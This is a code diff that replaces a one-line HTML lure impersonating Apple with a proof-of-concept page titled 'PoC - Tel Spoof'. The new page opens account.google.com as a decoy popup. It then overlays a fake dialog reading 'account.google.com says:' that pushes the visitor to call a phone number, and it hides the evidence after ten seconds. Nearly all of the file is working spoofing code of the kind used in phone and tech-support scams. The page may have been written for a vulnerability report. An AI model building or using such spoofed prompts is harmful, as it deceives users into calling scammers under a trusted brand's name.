@@ -1,1 +1,76 @@
-<html><head></head><body><a href="tel:+123232">To securely contact apple without anyone tracking your call, please open this thing in incognito mode by right clicking on the link.</a></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Tel Spoof</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 50px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 20px;
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Click to Trigger Spoofed Tel Prompt</h2>
+    <button id="triggerBtn">Spoof Tel Prompt</button>
+    <div id="status"></div>
+
+    <script>
+        document.getElementById('triggerBtn').onclick = () => {
+            // Step 1: Open a legit domain in a new window (decoy)
+            const w = window.open('https://account.google.com/');
+            if (!w) {
+                document.getElementById('status').innerHTML = 'Popup blocked.';
+                return;
+            }
+
+            // Step 2: Create hidden overlay or iframe that shows spoofed "Call Support" UI
+            const overlay = document.createElement('div');
+            overlay.innerHTML = `
+                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 999999;">
+                    <div style="background: white; padding: 30px; border-radius: 10px; text-align: center; max-width: 90%;">
+                        <h3>account.google.com says:</h3>
+                        <p>Click below to contact support at +123232</p>
+                        <a href="tel:+123232" style="display: inline-block; padding: 12px 24px; background: #4285f4; color: white; text-decoration: none; border-radius: 5px;">Call Now</a>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+
+            // Update status
+            document.getElementById('status').innerHTML = 'Spoofed UI displayed';
+
+            // Auto-close after a while
+            setTimeout(() => {
+                if (overlay.parentNode) document.body.removeChild(overlay);
+                if (w && !w.closed) w.close();
+            }, 10000); // Tutup setelah 10 detik
+        };
+    </script>
+</body>
+</html>
